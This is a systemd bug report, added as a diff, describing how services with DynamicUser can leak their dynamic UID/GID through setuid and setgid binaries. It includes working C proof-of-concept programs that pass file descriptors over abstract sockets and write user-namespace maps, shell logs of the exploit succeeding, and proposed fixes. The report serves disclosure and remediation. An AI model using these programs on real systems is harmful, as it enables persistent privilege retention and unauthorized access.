@@ -1,0 +1,305 @@
+This bug report describes a bug in systemd that allows a service with
+DynamicUser in collaboration with another service or user to create a setuid
+binary that can be used to access its UID beyond the lifetime of the service.
+This bug probably has relatively low severity, given that there aren't many
+services yet that use DynamicUser, and the requirement of collaboration with
+another process limits the circumstances in which it would be useful to an
+attacker further; but in a system that makes heavy use of DynamicUser, it would
+probably have impact.
+
+<https://www.freedesktop.org/software/systemd/man/systemd.exec.html#DynamicUser=>
+says:
+
+    In order to allow the service to write to certain directories, they have to
+    be whitelisted using ReadWritePaths=, but care must be taken so that UID/GID
+    recycling doesn't create security issues involving files created by the
+    service.
+
+While I was chatting about DynamicUser with catern on IRC, I noticed that
+DynamicUser doesn't isolate the service from the rest of the system in terms of
+UNIX domain sockets; therefore, if a collaborating user passes a file descriptor
+to a world-writable path outside the service's mount namespace into the
+service, the service can then create setuid files that can be used by the
+collaborating user beyond the lifetime of the service.
+
+
+To reproduce:
+
+As a user:
+======================================================================
+user@deb10:~$ mkdir systemd_uidleak
+user@deb10:~$ cd systemd_uidleak
+user@deb10:~/systemd_uidleak$ cat > breakout_assisted.c
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <sys/socket.h>
+#include <sys/un.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <err.h>
+
+int main(void) {
+  setbuf(stdout, NULL);
+
+  // prepare unix domain socket
+  int s = socket(AF_UNIX, SOCK_DGRAM, 0);
+  if (s < 0) err(1, "unable to create unix domain socket");
+  struct sockaddr_un addr = {
+    .sun_family = AF_UNIX,
+    .sun_path = "\0breakout"
+  };
+  if (bind(s, (struct sockaddr *)&addr, sizeof(sa_family_t)+1+8))
+    err(1, "unable to bind abstract socket");
+  puts("waiting for connection from outside the service...");
+
+  // receive fd to somewhere under the real root
+  int len = sizeof(struct cmsghdr) + sizeof(int);
+  struct cmsghdr *hdr = alloca(len);
+  struct msghdr msg = {
+    .msg_control = hdr,
+    .msg_controllen = len
+  };
+  if (recvmsg(s, &msg, 0) < 0) err(1, "unable to receive fd");
+  if (hdr->cmsg_len != len || hdr->cmsg_level != SOL_SOCKET
+      || hdr->cmsg_type != SCM_RIGHTS)
+    errx(1, "got bad message");
+  puts("got rootfd from other chroot...");
+  if (fchdir(*(int*)CMSG_DATA(hdr))) err(1, "unable to change into real root");
+  char curpath[4096];
+  if (!getcwd(curpath, sizeof(curpath))) err(1, "unable to getpath()");
+  printf("chdir successful, am now in %s\n", curpath);
+
+  // create suid file
+  int src_fd = open("suid_src", O_RDONLY);
+  if (src_fd == -1) err(1, "open suid_src");
+  int dst_fd = open("suid_dst", O_RDWR|O_CREAT|O_EXCL, 0644);
+  if (dst_fd == -1) err(1, "open suid_dst");
+
+  while (1) {
+    char buf[1000];
+    ssize_t res = read(src_fd, buf, sizeof(buf));
+    if (res == -1) err(1, "read");
+    if (res == 0) break;
+    ssize_t res2 = write(dst_fd, buf, res);
+    if (res2 != res) err(1, "write");
+  }
+
+  if (fchmod(dst_fd, 04755)) err(1, "fchmod");
+  close(src_fd);
+  close(dst_fd);
+
+  // and that's it!
+  puts("done!");
+  while (1) pause();
+  return 0;
+}
+user@deb10:~/systemd_uidleak$ gcc -o breakout_assisted breakout_assisted.c 
+user@deb10:~/systemd_uidleak$ cat > breakout_helper.c
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <fcntl.h>
+#include <sys/socket.h>
+#include <sys/un.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <err.h>
+
+int main(void) {
+  int rootfd = open(".", O_PATH);
+  if (rootfd < 0) err(1, "unable to open cwdfd");
+  int s = socket(AF_UNIX, SOCK_DGRAM, 0);
+  if (s < 0) err(1, "unable to create unix domain socket");
+  struct sockaddr_un addr = {
+    .sun_family = AF_UNIX,
+    .sun_path = "\0breakout"
+  };
+  if (connect(s, (struct sockaddr *)&addr, sizeof(sa_family_t)+1+8))
+    err(1, "unable to connect to abstract socket");
+  puts("connected to other chroot, sending cwdfd...");
+
+  int len = sizeof(struct cmsghdr) + sizeof(int);
+  struct cmsghdr *hdr = alloca(len);
+  *hdr = (struct cmsghdr) {
+    .cmsg_len = len,
+    .cmsg_level = SOL_SOCKET,
+    .cmsg_type = SCM_RIGHTS
+  };
+  *(int*)CMSG_DATA(hdr) = rootfd;
+  struct msghdr msg = {
+    .msg_control = hdr,
+    .msg_controllen = len
+  };
+  if (sendmsg(s, &msg, 0) < 0) err(1, "unable to send fd");
+  puts("all ok on this side!");
+  return 0;
+}
+user@deb10:~/systemd_uidleak$ gcc -o breakout_helper breakout_helper.c 
+user@deb10:~/systemd_uidleak$ cp /usr/bin/id suid_src
+user@deb10:~/systemd_uidleak$ chmod 0777 .
+user@deb10:~/systemd_uidleak$ ls -la .
+total 100
+drwxrwxrwx  2 user user  4096 Feb  4 21:22 .
+drwxr-xr-x 23 user user  4096 Feb  4 21:19 ..
+-rwxr-xr-x  1 user user 17432 Feb  4 21:20 breakout_assisted
+-rw-r--r--  1 user user  1932 Feb  4 21:20 breakout_assisted.c
+-rwxr-xr-x  1 user user 16872 Feb  4 21:22 breakout_helper
+-rw-r--r--  1 user user  1074 Feb  4 21:22 breakout_helper.c
+-rwxr-xr-x  1 user user 43808 Feb  4 21:22 suid_src
+user@deb10:~/systemd_uidleak$ 
+======================================================================
+
+Then, as root, create and launch a service around breakout_assisted:
+======================================================================
+root@deb10:/home/user# cat > /etc/systemd/system/dynamic-user-test.service
+[Service]
+ExecStart=/home/user/systemd_uidleak/breakout_assisted
+DynamicUser=yes
+root@deb10:/home/user# systemctl daemon-reload
+root@deb10:/home/user# systemctl start dynamic-user-test.service
+root@deb10:/home/user# systemctl status dynamic-user-test.service
+[...]
+Feb 04 21:27:29 deb10 systemd[1]: Started dynamic-user-test.service.
+Feb 04 21:27:29 deb10 breakout_assisted[3155]: waiting for connection from outside the service...
+root@deb10:/home/user# 
+======================================================================
+
+Now again as a user, run the breakout_helper:
+======================================================================
+user@deb10:~/systemd_uidleak$ ./breakout_helper 
+connected to other chroot, sending cwdfd...
+all ok on this side!
+user@deb10:~/systemd_uidleak$ ls -la
+total 144
+drwxrwxrwx  2 user  user   4096 Feb  4 21:28 .
+drwxr-xr-x 23 user  user   4096 Feb  4 21:19 ..
+-rwxr-xr-x  1 user  user  17432 Feb  4 21:20 breakout_assisted
+-rw-r--r--  1 user  user   1932 Feb  4 21:20 breakout_assisted.c
+-rwxr-xr-x  1 user  user  16872 Feb  4 21:22 breakout_helper
+-rw-r--r--  1 user  user   1074 Feb  4 21:22 breakout_helper.c
+-rwsr-xr-x  1 64642 64642 43808 Feb  4 21:28 suid_dst
+-rwxr-xr-x  1 user  user  43808 Feb  4 21:22 suid_src
+user@deb10:~/systemd_uidleak$ ./suid_dst 
+uid=1000(user) gid=1000(user) euid=64642 groups=1000(user),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(lpadmin),113(scanner)
+user@deb10:~/systemd_uidleak$ 
+======================================================================
+
+
+On fixing this:
+
+catern suggested that it might be more robust to use seccomp() to block
+chmod()/fchmod() calls with modes that include setuid/setgid bits, like the
+Nix build process. See
+<https://nixos.org/releases/nix/nix-2.1.3/manual/#ssec-relnotes-1.11.10>:
+
+> To prevent this issue, Nix now disallows builders to create setuid and setgid
+> binaries. On Linux, this is done using a seccomp BPF filter.
+
+This seems like the least intrusive fix to me. As far as I can tell, it should
+be sufficient to prevent the creation of setuid binaries that are reachable
+beyond the death of the service. Unfortunately, for setgid files, the following
+trick also needs to be mitigated, assuming that the distribution hasn't blocked
+the unprivileged creation of user namespaces:
+
+======================================================================
+user@deb10:~/systemd_uidleak_gid$ cat map_setter.c
+#include <unistd.h>
+#include <fcntl.h>
+#include <err.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+static void write_file(char *type, int pid, char *buf) {
+  char file_path[100];
+  sprintf(file_path, "/proc/%d/%s", pid, type);
+  int fd = open(file_path, O_WRONLY);
+  if (fd == -1) err(1, "open %s", file_path);
+  if (write(fd, buf, strlen(buf)) != strlen(buf))
+    err(1, "write %s", type);
+  close(fd);
+}
+
+static void write_map(char *type, int pid, int upper, int lower) {
+  char buf[100];
+  sprintf(buf, "%d %d 1", upper, lower);
+  write_file(type, pid, buf);
+}
+
+int main(void) {
+  FILE *pid_file = fopen("/home/user/systemd_uidleak_gid/pid_file", "r");
+  if (pid_file == NULL) err(1, "open pid_file");
+  int pid;
+  if (fscanf(pid_file, "%d", &pid) != 1) err(1, "fscanf");
+
+  write_file("setgroups", pid, "deny");
+  write_map("gid_map", pid, 0, getgid());
+  write_map("uid_map", pid, 0, geteuid());
+  puts("done");
+  while (1) pause();
+  return 0;
+}
+user@deb10:~/systemd_uidleak_gid$ cat sgid_maker.c
+#define _GNU_SOURCE
+#include <sched.h>
+#include <err.h>
+#include <unistd.h>
+#include <string.h>
+#include <fcntl.h>
+#include <stdio.h>
+#include <sys/stat.h>
+int main(void) {
+  if (unshare(CLONE_NEWUSER)) err(1, "unshare CLONE_NEWUSER");
+  pid_t my_pid = getpid();
+  char my_pid_str[20];
+  sprintf(my_pid_str, "%d\n", (int)my_pid);
+  int pid_file = open("pid_file", O_WRONLY|O_CREAT|O_TRUNC, 0644);
+  if (pid_file == -1) err(1, "create pid_file");
+  if (write(pid_file, my_pid_str, strlen(my_pid_str)) != strlen(my_pid_str)) err(1, "write pid_file");
+  close(pid_file);
+  puts("pid file written, waiting for mappings...");
+  while (1) {
+    if (getuid() == 0) break;
+    sleep(1);
+  }
+  puts("mappings are up!");
+  if (setgid(0)) err(1, "setgid");
+
+  // create sgid file
+  int src_fd = open("sgid_src", O_RDONLY);
+  if (src_fd == -1) err(1, "open sgid_src");
+  int dst_fd = open("sgid_dst", O_RDWR|O_CREAT|O_EXCL, 0644);
+  if (dst_fd == -1) err(1, "open sgid_dst");
+  while (1) {
+    char buf[1000];
+    ssize_t res = read(src_fd, buf, sizeof(buf));
+    if (res == -1) err(1, "read");
+    if (res == 0) break;
+    ssize_t res2 = write(dst_fd, buf, res);
+    if (res2 != res) err(1, "write");
+  }
+  if (fchmod(dst_fd, 02755)) err(1, "fchmod");
+  close(src_fd);
+  close(dst_fd);
+}
+user@deb10:~/systemd_uidleak_gid$ cp /usr/bin/id sgid_src
+user@deb10:~/systemd_uidleak_gid$ gcc -o map_setter map_setter.c && gcc -o sgid_maker sgid_maker.c && chmod u+s map_setter && ./sgid_maker 
+pid file written, waiting for mappings...
+[#####  at this point, launch ~/systemd_uidleak_gid/map_setter in a systemd service  #####]
+mappings are up!
+user@deb10:~/systemd_uidleak_gid$ ls -l sgid_dst
+-rwxr-sr-x 1 user 64642 43808 Feb  4 23:13 sgid_dst
+user@deb10:~/systemd_uidleak_gid$ ./sgid_dst
+uid=1000(user) gid=1000(user) egid=64642 groups=64642,24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(lpadmin),113(scanner),1000(user)
+user@deb10:~/systemd_uidleak_gid$ 
+======================================================================
+
+I think the least intrusive way to mitigate this part might be to enforce
+NoNewPrivileges=yes for services with dynamic IDs - that way, someone inside
+such a service can't become capable over anything outside, and someone outside
+the service can't become capable over anything inside the service.
+(And really, in general, it would be nice if NoNewPrivileges=yes could become
+the norm at some point.)
